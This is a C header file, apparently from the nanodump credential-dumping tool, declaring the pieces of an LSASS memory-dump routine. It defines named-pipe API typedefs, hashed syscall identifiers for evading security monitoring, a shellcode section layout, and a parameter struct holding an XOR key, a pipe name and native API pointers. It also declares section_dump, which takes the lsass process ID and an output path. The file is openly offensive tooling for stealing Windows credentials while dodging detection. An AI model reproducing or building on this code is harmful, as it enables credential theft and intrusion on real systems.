#pragma once

#include "nanodump.h"

typedef HANDLE (WINAPI* CreateNamedPipeA_t)(
    LPCSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode,
    DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize,
    DWORD nDefaultTimeOut, LPVOID lpSecurityAttributes);
typedef BOOL (WINAPI* ConnectNamedPipe_t)(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped);
typedef BOOL (WINAPI* ReadFile_t)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
typedef BOOL (WINAPI* DisconnectNamedPipe_t)(HANDLE hNamedPipe);

#define CreateNamedPipeA_SW2_HASH   0x58990484
#define ConnectNamedPipe_SW2_HASH   0x96019466
#define ReadFile_SW2_HASH           0x8D38978F
#define DisconnectNamedPipe_SW2_HASH 0xAEA47AEA
#define LAST_ERROR_OFFSET           0x68

#define SC_SECTION_SIZE   0x4000
#define SC_CODE_OFFSET    0x1000

typedef struct _SC_PARAMS {
    volatile DWORD status;
    DWORD error_code;
    DWORD dump_size_lo;
    DWORD dump_size_hi;
    WCHAR pipe_name[128];
    BYTE  xor_key[4];
    DWORD use_valid_sig;
    PVOID fn_NtQueryVirtualMemory;
    PVOID fn_NtCreateFile;
    PVOID fn_NtWriteFile;
    PVOID fn_NtClose;
    PVOID fn_NtAllocateVirtualMemory;
    PVOID fn_NtFreeVirtualMemory;
} SC_PARAMS;

BOOL section_dump(
    IN DWORD lsass_pid,
    IN BOOL write_to_disk,
    IN LPCSTR dump_path,
    IN BOOL use_valid_sig,
    IN DWORD chunk_size);
